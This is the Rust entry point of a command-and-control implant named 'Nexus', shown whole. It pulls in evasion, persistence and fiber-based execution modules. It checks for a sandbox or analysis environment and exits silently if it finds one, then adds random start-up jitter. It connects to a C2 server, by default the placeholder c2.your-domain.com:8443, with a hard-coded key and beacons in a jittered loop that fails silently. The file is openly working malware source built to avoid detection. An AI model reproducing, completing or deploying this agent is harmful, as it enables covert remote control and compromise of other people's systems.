use nexus_common::*;
use std::env;
use std::time::Duration;
use tokio::time::sleep;

mod agent;
mod communication;
mod evasion;
mod execution;
mod persistence;
mod system;

#[cfg(target_os = "windows")]
mod fiber_execution;

use agent::NexusAgent;
use evasion::EnvironmentChecker;

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging (in release mode, this should be minimal or disabled)
    #[cfg(debug_assertions)]
    env_logger::init();

    // Perform environment checks for sandbox/analysis detection
    if EnvironmentChecker::is_analysis_environment().await {
        // Exit silently if we detect analysis environment
        return Ok(());
    }

    // Add initial jitter delay
    let jitter = rand::random::<u64>() % 30 + 10;
    sleep(Duration::from_secs(jitter)).await;

    // Parse command line arguments with proper flag handling
    let args: Vec<String> = env::args().collect();
    let mut server_addr = "https://c2.your-domain.com:8443".to_string(); // Use 8443 to match server config

    // Parse --grpc-endpoint flag properly
    for i in 1..args.len() {
        if args[i] == "--grpc-endpoint" && i + 1 < args.len() {
            server_addr = args[i + 1].clone();
            break;
        }
    }

    #[cfg(debug_assertions)]
    println!("Connecting to server: {}", server_addr);

    // Create encryption key (in production, this should be embedded or derived)
    let encryption_key = [
        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32,
        0x10, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54,
        0x32, 0x10,
    ];

    // Initialize the agent
    let mut agent = NexusAgent::new(server_addr, encryption_key).await?;

    // Main agent loop with error recovery
    loop {
        match agent.run_cycle().await {
            Ok(_) => {
                // Successful cycle, add some jitter before next cycle
                let cycle_delay = rand::random::<u64>() % 60 + 30; // 30-90 seconds
                sleep(Duration::from_secs(cycle_delay)).await;
            }
            Err(e) => {
                // Log error in debug mode, otherwise fail silently
                #[cfg(debug_assertions)]
                eprintln!("Agent cycle error: {}", e);

                // Exponential backoff on errors
                let error_delay = rand::random::<u64>() % 300 + 60; // 1-6 minutes
                sleep(Duration::from_secs(error_delay)).await;
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_agent_initialization() {
        let server_addr = "127.0.0.1:4444".to_string();
        let key = [0u8; 32];

        // This should not panic
        let agent = NexusAgent::new(server_addr, key).await;
        assert!(agent.is_ok());
    }
}
